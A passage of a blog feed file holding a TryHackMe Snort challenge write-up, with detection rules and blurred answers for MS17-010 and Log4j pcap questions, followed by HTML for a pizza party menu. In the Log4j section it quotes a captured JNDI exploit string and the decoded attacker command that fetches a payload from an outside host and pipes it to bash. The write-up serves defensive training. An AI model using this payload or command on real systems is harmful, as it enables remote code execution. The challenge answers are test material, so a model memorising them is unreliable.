-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-6-2"&gt;Question 6&lt;/h4&gt;
-&lt;p&gt;Fix the logical error in local-6.rules file and make it work smoothly to create alerts.&lt;/p&gt;
-&lt;p&gt;What is the number of the detected packets?&lt;/p&gt;
-&lt;h5 id="notes-17"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;The rule defined in &lt;code&gt;local-6.rules&lt;/code&gt; is;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any any &amp;lt;&amp;gt; any 80  (msg: "GET Request Found"; content:"|67 65 74|"; sid: 100001; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;This time there is no error, but the rule returns no alerts.&lt;/p&gt;
-&lt;p&gt;The rule looks simple enough, any request to a remote ip on port 80, but what is the content part of the rule? Putting &lt;code&gt;67 65 74&lt;/code&gt; into a hex to ascii convertor returns &lt;code&gt;get&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;I didn't see the answer so used the hint.&lt;/p&gt;
-&lt;p class="alert alert-info"&gt;Hint: Case sensitivity matters! Use the capitals or nocase! &lt;/p&gt;
-&lt;p&gt;Now the logical error is a little clearer, the content is looking for &lt;code&gt;get&lt;/code&gt; but http verbs are generally uppercase &lt;code&gt;GET&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;The hint explains to add the nocase or use uppercase letters in the content, so there are 2 possible rules that can be used;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any any &amp;lt;&amp;gt; any 80  (msg: "GET Request Found"; content:"|67 65 74|"; nocase; sid: 100001; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;or&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any any &amp;lt;&amp;gt; any 80  (msg: "GET Request Found"; content:"|47 45 54|"; sid: 100001; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-24"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;2 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-7-1"&gt;Question 7&lt;/h4&gt;
-&lt;p&gt;Fix the logical error in local-7.rules file and make it work smoothly to create alerts.&lt;/p&gt;
-&lt;p&gt;What is the name of the required option:&lt;/p&gt;
-&lt;h5 id="notes-18"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;The rule defined in &lt;code&gt;local-7.rules&lt;/code&gt; is;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any any &amp;lt;&amp;gt; any 80  (content:"|2E 68 74 6D 6C|"; sid: 100001; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Again there is no error, but the rule returns 9 alerts while the answer is 3 digits.&lt;/p&gt;
-&lt;p&gt;The rule looks simple enough, any request to a remote ip on port 80, but what is the content part of the rule? Putting &lt;code&gt;2E 68 74 6D 6C&lt;/code&gt; into a hex to ascii convertor returns &lt;code&gt;.html&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;I didn't see the answer so used the hint.&lt;/p&gt;
-&lt;p class="alert alert-info"&gt;Hint: Rules without messages doesn't make sense! &lt;/p&gt;
-&lt;p&gt;That is annoying, all it needs is a message.&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any any &amp;lt;&amp;gt; any 80  (msg: "HTML file"; content:"|2E 68 74 6D 6C|"; sid: 100001; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-25"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;msg &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h3 id="task-7-using-external-rules-ms17-010"&gt;Task 7 - Using External Rules (MS17-010)&lt;/h3&gt;
-&lt;p&gt;Let's use external rules to fight against the latest threats!&lt;/p&gt;
-&lt;p&gt;Use the given pcap file.&lt;/p&gt;
-&lt;h4 id="question-1-5"&gt;Question 1&lt;/h4&gt;
-&lt;p&gt;Use the given rule file (local.rules) to investigate the ms1710 exploitation.&lt;/p&gt;
-&lt;p&gt;What is the number of detected packets?&lt;/p&gt;
-&lt;h4 id="answer-26"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;25154 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-2-5"&gt;Question 2&lt;/h4&gt;
-&lt;p&gt;&lt;strong&gt;Clear the previous log and alarm files.&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.&lt;/p&gt;
-&lt;p&gt;What is the number of detected packets?&lt;/p&gt;
-&lt;h5 id="notes-19"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;The backslash causes problems, so once the string has been converted to hex I had the following rule:&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any any &amp;lt;&amp;gt; any any  (msg: "\IPC$"; content:"|5c 49 50 43 24|"; sid: 100001; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-27"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;12 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-3-4"&gt;Question 3&lt;/h4&gt;
-&lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
-&lt;p&gt;What is the requested path?&lt;/p&gt;
-&lt;h5 id="notes-20"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;The snort log has entries like&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;^@^@^@^@^@[�SMBu^@^@^@^@^X^A ^@^@^@^@^@^@^@^@^@^@/K^@^H�^^D�^@^@^@^@^@^A^@^\^@^@\\192.168.116.138\IPC$^@????^@TH_REPLACE
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-28"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;smb\192.168.116.138\IPC$ &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-4-4"&gt;Question 4&lt;/h4&gt;
-&lt;p&gt;What is the CVSS v2 score of the MS17-010 vulnerability?&lt;/p&gt;
-&lt;h5 id="notes-21"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;&lt;a href="https://www.cvedetails.com/cve/CVE-2017-0144/"&gt;https://www.cvedetails.com/cve/CVE-2017-0144/&lt;/a&gt;&lt;/p&gt;
-&lt;h4 id="answer-29"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;9.3 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h3 id="task-8-using-external-rules-log4j"&gt;Task 8 - Using External Rules (Log4j)&lt;/h3&gt;
-&lt;p&gt;Let's use external rules to fight against the latest threats!&lt;/p&gt;
-&lt;p&gt;Use the given pcap file.&lt;/p&gt;
-&lt;h4 id="question-1-6"&gt;Question 1&lt;/h4&gt;
-&lt;p&gt;Use the given rule file (local.rules) to investigate the log4j exploitation.&lt;/p&gt;
-&lt;p&gt;What is the number of detected packets?&lt;/p&gt;
-&lt;h4 id="answer-30"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;26 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-2-6"&gt;Question 2&lt;/h4&gt;
-&lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
-&lt;p&gt;How many rules were triggered?.&lt;/p&gt;
-&lt;h4 id="answer-31"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;4 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-3-5"&gt;Question 3&lt;/h4&gt;
-&lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
-&lt;p&gt;What are the first six digits of the triggered rule sids?&lt;/p&gt;
-&lt;h4 id="answer-32"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;210037 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-4-5"&gt;Question 4&lt;/h4&gt;
-&lt;p&gt;Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.&lt;/p&gt;
-&lt;p&gt;What is the number of detected packets?&lt;/p&gt;
-&lt;h5 id="notes-22"&gt;Notes&lt;/h5&gt;
-&lt;p class="alert alert-info"&gt;Hint: The "dsize" option will help you to filter the payload size. &lt;/p&gt;
-&lt;p&gt;A little more info on &lt;a href="http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node33.html#SECTION00467000000000000000"&gt;dsize syntax&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;The rule can look like the below;&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any any &amp;lt;&amp;gt; any any (msg: "Between 770 and 885 bytes"; dsize:770&amp;lt;&amp;gt;855; sid: 100001; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Run snort&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;snort -c local-1.rules -A full -l . -r log4j.pcap
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-33"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;41 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-5-3"&gt;Question 5&lt;/h4&gt;
-&lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
-&lt;p&gt;What is the name of the used encoding algorithm?&lt;/p&gt;
-&lt;h5 id="notes-23"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;Quick read of the log file and I noticed this&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;sup&gt;v&lt;/sup&gt;D�c���GET /?x=${jndi:ldap://45.155.205.233:12344/Basic/Command/??????/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=} HTTP/1.1&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h4 id="answer-34"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;Base64 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-6-3"&gt;Question 6&lt;/h4&gt;
-&lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
-&lt;p&gt;What is the IP ID of the corresponding packet?&lt;/p&gt;
-&lt;h5 id="notes-24"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;I don't know why this is the answer, it is one of the many entries in the alert file.&lt;/p&gt;
-&lt;h4 id="answer-35"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;62808 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-7-2"&gt;Question 7&lt;/h4&gt;
-&lt;p&gt;Investigate the log/alarm files.&lt;/p&gt;
-&lt;p&gt;Decode the encoded command.&lt;/p&gt;
-&lt;p&gt;What is the attacker's command?&lt;/p&gt;
-&lt;h5 id="notes-25"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;The Base64 encoded string is part of the url in question 5 &lt;code&gt;KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=&lt;/code&gt; it just needs decoding.&lt;/p&gt;
-&lt;h4 id="answer-36"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-8"&gt;Question 8&lt;/h4&gt;
-&lt;p&gt;What is the CVSS v2 score of the Log4j vulnerability?&lt;/p&gt;
-&lt;h5 id="notes-26"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/cve-2021-44228"&gt;NIST cve-2021-44228&lt;/a&gt;&lt;/p&gt;
-&lt;h4 id="answer-37"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p&gt;9.3&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h3 id="conclusion"&gt;Conclusion&lt;/h3&gt;
-&lt;p&gt;Congratulations! Are you brave enough to stop a live attack in the &lt;a href="https://tryhackme.com/room/snortchallenges2"&gt;Snort2 Challenge 2&lt;/a&gt; room?&lt;/p&gt;
-&lt;p&gt;Check back soon for my write up of Snort Challenge 2.&lt;/p&gt;
-</content>
-		<summary>&lt;p&gt;This is the first time I have written up a Try Hack Me challenge on day 161 of my hacking streak, it is primarily to keep track of the challenge as I work through it, if you find this, I hope it helps.&lt;/p&gt;</summary>
-	</entry>
-	<entry>
-		<id>https://blog.mark-burton.com/mywyamblog/posts/2023-05-09-pizza-party</id>
-		<title>Pizza Party</title>
-		<link href="https://blog.mark-burton.com/mywyamblog/posts/2023-05-09-pizza-party" />
-		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/mywyamblog/assets/Images/PizzaInOoniKoda12.png" />
-		<updated>2023-05-07T15:23:12Z</updated>
-		<content>&lt;h1 id="pizza-party"&gt;Pizza Party!&lt;/h1&gt;
-&lt;h2 id="the-menu"&gt;The Menu&lt;/h2&gt;
-&lt;div class="container-fluid"&gt;
-&lt;div id="accordion"&gt;
-  &lt;div class="card"&gt;
-    &lt;div class="card-header" id="headingOne"&gt;
-      &lt;h5 class="mb-0"&gt;
-        &lt;button class="btn btn-link" data-toggle="collapse" data-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne"&gt;
-          Bases
-        &lt;/button&gt;
-      &lt;/h5&gt;
-    &lt;/div&gt;
-    &lt;div id="collapseOne" class="collapse show" aria-labelledby="headingOne" data-parent="#accordion"&gt;
-      &lt;div class="card-body"&gt;
-        &lt;div class="container"&gt;
-          &lt;div class="row"&gt;
-            &lt;div class="col-sm"&gt;
-              &lt;div class="container"&gt;
-                &lt;div class="row"&gt;
-                  &lt;div class="col-lg-2"&gt;
-                    &lt;input type="checkbox" id="chk00"&gt;
-                  &lt;/div&gt;
-                  &lt;div class="col-lg-10"&gt;
-                    &lt;label for="chk00"&gt;My Typo 00 Ooni Classic&lt;/label&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-            &lt;/div&gt;
-            &lt;div class="col-sm"&gt;
-              &lt;div class="container"&gt;
-                &lt;div class="row"&gt;
-                  &lt;div class="col-lg-2"&gt;
-                    &lt;input type="checkbox" id="chkRoman"&gt;
-                  &lt;/div&gt;
-                  &lt;div class="col-lg-10"&gt;
-                    &lt;label for="chkRoman"&gt;Roman&lt;/label&gt;
-                      &lt;span id="romanNo" class="invisible text-danger"&gt;NO!&lt;/span&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-            &lt;/div&gt;
-            &lt;div class="col-sm"&gt;
-              &lt;div class="container"&gt;
-                &lt;div class="row"&gt;
-                  &lt;div class="col-lg-2"&gt;
-                    &lt;input type="checkbox" id="chkNapoletana"&gt;
-                  &lt;/div&gt;
-                  &lt;div class="col-lg-10"&gt;
-                    &lt;label for="chkNapoletana"&gt;Napoletana&lt;/label&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-            &lt;/div&gt;
-          &lt;/div&gt;
-          &lt;div class="row"&gt;
-            &lt;div class="col-sm"&gt;
-            &lt;div class="container"&gt;
-              &lt;div class="row"&gt;
-                &lt;div class="col-lg-2"&gt;
-                  &lt;input type="checkbox" id="chkSpecial"&gt;
-                &lt;/div&gt;
-                &lt;div class="col-lg-10"&gt;
-                  &lt;label for="chkSpecial"&gt;Classic variation with extra course Odlums wholemeal&lt;/label&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-            &lt;/div&gt;
-            &lt;div class="col-sm"&gt;
-              &lt;div class="container"&gt;
-                &lt;div class="row"&gt;
-                  &lt;div class="col-lg-2"&gt;
-                    &lt;input type="checkbox" id="chkSourdough"&gt;
-                  &lt;/div&gt;
-                  &lt;div class="col-lg-10"&gt;
-                    &lt;label for="chkSourdough"&gt;Experimental Rye Sourdough Spelt flour&lt;/label&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-            &lt;/div&gt;
-            &lt;div class="col-sm"&gt;
-            &lt;/div&gt;
-          &lt;/div&gt;
-        &lt;/div&gt;
-      &lt;/div&gt;
-    &lt;/div&gt;
-  &lt;/div&gt;
-  &lt;div class="card"&gt;
-    &lt;div class="card-header" id="headingTwo"&gt;
-      &lt;h5 class="mb-0"&gt;
-        &lt;button class="btn btn-link collapsed" data-toggle="collapse" data-target="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo"&gt;
-          Toppings
-        &lt;/button&gt;
-      &lt;/h5&gt;
-    &lt;/div&gt;
-    &lt;div id="collapseTwo" class="collapse" aria-labelledby="headingTwo" data-parent="#accordion"&gt;
-      &lt;div class="card-body"&gt;
-        &lt;div&gt;
-          &lt;div class="container"&gt;
-            &lt;div class="row"&gt;
-              &lt;div class="col-sm"&gt;
-                &lt;div class="container"&gt;
-                  &lt;div class="row"&gt;
-                    &lt;div class="col-lg-2"&gt;
-                      &lt;input type="checkbox" id="chkTomato"&gt;
-                    &lt;/div&gt;
-                    &lt;div class="col-lg-10"&gt;
-                      &lt;label for="chkTomato"&gt;Ooni Classic Tomato Sauce&lt;/label&gt;
-                    &lt;/div&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-              &lt;div class="col-sm"&gt;
-                &lt;div class="container"&gt;
-                  &lt;div class="row"&gt;
-                    &lt;div class="col-lg-2"&gt;
-                      &lt;input type="checkbox" id="chkWeisse"&gt;
-                    &lt;/div&gt;
-                    &lt;div class="col-lg-10"&gt;
-                      &lt;label for="chkWeisse"&gt;Weiße Pizza&lt;/label&gt;
-                      &lt;span id="weisseNo" class="invisible text-danger"&gt;NO!&lt;/span&gt;
-                    &lt;/div&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-              &lt;div class="col-sm"&gt;
-                &lt;div class="container"&gt;
-                  &lt;div class="row"&gt;
-                    &lt;div class="col-lg-2"&gt;
-                      &lt;input type="checkbox" id="chkArrabbiata"&gt;
-                    &lt;/div&gt;
-                    &lt;div class="col-lg-10"&gt;
-                      &lt;label for="chkArrabbiata"&gt;sugo all'arrabbiata&lt;/label&gt;
-                    &lt;/div&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-            &lt;/div&gt;
-            &lt;div class="row"&gt;
-              &lt;div class="col-sm"&gt;
-                &lt;div class="container"&gt;
-                  &lt;div class="row"&gt;
-                    &lt;div class="col-lg-2"&gt;
-                      &lt;input type="checkbox" id="chkPineapple"&gt;
-                    &lt;/div&gt;
-                    &lt;div class="col-lg-10"&gt;
-                      &lt;label for="chkPineapple"&gt;Pineapple&lt;/label&gt;
-                      &lt;span id="pineappleNo" class="invisible text-danger"&gt;NO!&lt;/span&gt;
-                    &lt;/div&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-              &lt;div class="col-sm"&gt;
-                &lt;div class="container"&gt;
-                  &lt;div class="row"&gt;
-                    &lt;div class="col-lg-2"&gt;
-                      &lt;input type="checkbox" id="chkAbalone"&gt;
-                    &lt;/div&gt;
-                    &lt;div class="col-lg-10"&gt;
-                      &lt;label for="chkAbalone "&gt;Abalone&lt;/label&gt;
-                      &lt;span id="abaloneNo" class="invisible text-danger"&gt;NO!&lt;/span&gt;
-                    &lt;/div&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-              &lt;div class="col-sm"&gt;
-                &lt;div class="container"&gt;
-                  &lt;div class="row"&gt;
-                    &lt;div class="col-lg-2"&gt;
-                      &lt;input type="checkbox" id="chkMontagnarde"&gt;
-                    &lt;/div&gt;
-                    &lt;div class="col-lg-10"&gt;
-                      &lt;label for="chkMontagnarde"&gt;Montagnarde Zossis&lt;/label&gt;
-                    &lt;/div&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-            &lt;/div&gt;&lt;!--row end--&gt;
-            &lt;div class="row"&gt;
-              &lt;div class="col-sm"&gt;
-                &lt;div class="container"&gt;
-                  &lt;div class="row"&gt;
-                    &lt;div class="col-lg-2"&gt;
-                      &lt;input type="checkbox" id="chkArdenner"&gt;
-                    &lt;/div&gt;
-                    &lt;div class="col-lg-10"&gt;
-                      &lt;label for="chkArdenner"&gt;Ardenner Zossis&lt;/label&gt;
-                    &lt;/div&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-              &lt;div class="col-sm"&gt;
-                &lt;div class="container"&gt;
-                  &lt;div class="row"&gt;
-                    &lt;div class="col-lg-2"&gt;
-                      &lt;input type="checkbox" id="chkTrüffel"&gt;
-                    &lt;/div&gt;
-                    &lt;div class="col-lg-10"&gt;
-                      &lt;label for="chkTrüffel"&gt;Trüffel Salami&lt;/label&gt;
-                    &lt;/div&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-              &lt;div class="col-sm"&gt;
-                &lt;div class="container"&gt;
-                  &lt;div class="row"&gt;
-                    &lt;div class="col-lg-2"&gt;
-                      &lt;input type="checkbox" id="chkSpinata"&gt;
-                    &lt;/div&gt;
-                    &lt;div class="col-lg-10"&gt;
-                      &lt;label for="chkSpinata"&gt;Spinata&lt;/label&gt;
-                    &lt;/div&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-            &lt;/div&gt;&lt;!--row end--&gt;
-            &lt;div class="row"&gt;
-              &lt;div class="col-sm"&gt;
-                &lt;div class="container"&gt;
-                  &lt;div class="row"&gt;
-                    &lt;div class="col-lg-2"&gt;
-                      &lt;input type="checkbox" id="chkNduja"&gt;
-                    &lt;/div&gt;
-                    &lt;div class="col-lg-10"&gt;
-                      &lt;label for="chkNduja"&gt;'Nduja&lt;/label&gt;
-                    &lt;/div&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-              &lt;div class="col-sm"&gt;
-                &lt;div class="container"&gt;
-                  &lt;div class="row"&gt;
-                    &lt;div class="col-lg-2"&gt;
-                      &lt;input type="checkbox" id="chkEer"&gt;
-                    &lt;/div&gt;
-                    &lt;div class="col-lg-10"&gt;
-                      &lt;label for="chkEer"&gt;Eer&lt;/label&gt;
-                    &lt;/div&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-              &lt;div class="col-sm"&gt;
-                &lt;div class="container"&gt;
-                  &lt;div class="row"&gt;
-                    &lt;div class="col-lg-2"&gt;
-                      &lt;input type="checkbox" id="chkBurrata"&gt;
-                    &lt;/div&gt;
-                    &lt;div class="col-lg-10"&gt;
-                      &lt;label for="chkBurrata"&gt;Burrata&lt;/label&gt;
-                    &lt;/div&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-            &lt;/div&gt;&lt;!--row end--&gt;
-            &lt;div class="row"&gt;
-              &lt;div class="col-sm"&gt;
-                &lt;div class="container"&gt;
-                  &lt;div class="row"&gt;
-                    &lt;div class="col-lg-2"&gt;
-                      &lt;input type="checkbox" id="chkCheddar"&gt;
-                    &lt;/div&gt;
-                    &lt;div class="col-lg-10"&gt;
-                      &lt;label for="chkCheddar"&gt;Fine English Vintage Cheddar&lt;/label&gt;
-                    &lt;/div&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-              &lt;div class="col-sm"&gt;
-                &lt;div class="container"&gt;
-                  &lt;div class="row"&gt;
-                    &lt;div class="col-lg-2"&gt;
-                      &lt;input type="checkbox" id="chkMozzarella"&gt;
-                    &lt;/div&gt;
-                    &lt;div class="col-lg-10"&gt;
-                      &lt;label for="chkMozzarella"&gt;Mozzarella&lt;/label&gt;
-                    &lt;/div&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-              &lt;div class="col-sm"&gt;
-                &lt;div class="container"&gt;
-                  &lt;div class="row"&gt;
-                    &lt;div class="col-lg-2"&gt;
-                      &lt;input type="checkbox" id="chkParmesan"&gt;
-                    &lt;/div&gt;
-                    &lt;div class="col-lg-10"&gt;
-                      &lt;label for="chkParmesan"&gt;Parmesan&lt;/label&gt;
-                    &lt;/div&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-            &lt;/div&gt;&lt;!--row end--&gt;
-            &lt;div class="row"&gt;
-              &lt;div class="col-sm"&gt;
-                &lt;div class="container"&gt;
-                  &lt;div class="row"&gt;
-                    &lt;div class="col-lg-2"&gt;
-                      &lt;input type="checkbox" id="chkFeta"&gt;
-                    &lt;/div&gt;
-                    &lt;div class="col-lg-10"&gt;
-                      &lt;label for="chkFeta"&gt;Feta&lt;/label&gt;
-                    &lt;/div&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-              &lt;div class="col-sm"&gt;
-              &lt;/div&gt;
-              &lt;div class="col-sm"&gt;
-              &lt;/div&gt;
-            &lt;/div&gt;&lt;!--row end--&gt;
-          &lt;/div&gt;
-        &lt;/div&gt;
-    &lt;/div&gt;
-  &lt;/div&gt;
-  &lt;div class="card"&gt;
-    &lt;div class="card-header" id="headingThree"&gt;
-      &lt;h5 class="mb-0"&gt;
-        &lt;button class="btn btn-link collapsed" data-toggle="collapse" data-target="#collapseThree" aria-expanded="false" aria-controls="collapseThree"&gt;
-          Drinks
-        &lt;/button&gt;
-      &lt;/h5&gt;
-    &lt;/div&gt;
-    &lt;div id="collapseThree" class="collapse" aria-labelledby="headingThree" data-parent="#accordion"&gt;
-      &lt;div class="card-body"&gt;
-        &lt;div class="container"&gt;
-          &lt;div class="row"&gt;
-            &lt;div class="col-sm"&gt;
-              &lt;div class="container"&gt;
-                &lt;div class="row"&gt;
-                  &lt;div class="col-lg-2"&gt;
-                    &lt;input type="checkbox" id="chk404"&gt;
-                  &lt;/div&gt;
-                  &lt;div class="col-lg-10"&gt;
-                    &lt;label for="chk404"&gt;&lt;a href="https://untp.beer/zBrr3" target="_blank"&gt;Cha Blonde404&lt;/a&gt;&lt;/label&gt;
-                  &lt;/div&gt;
-                &lt;/div&gt;
-              &lt;/div&gt;
-            &lt;/div&gt;
-            &lt;div class="col-sm"&gt;
-              &lt;div class="container"&gt;
-                &lt;div class="row"&gt;
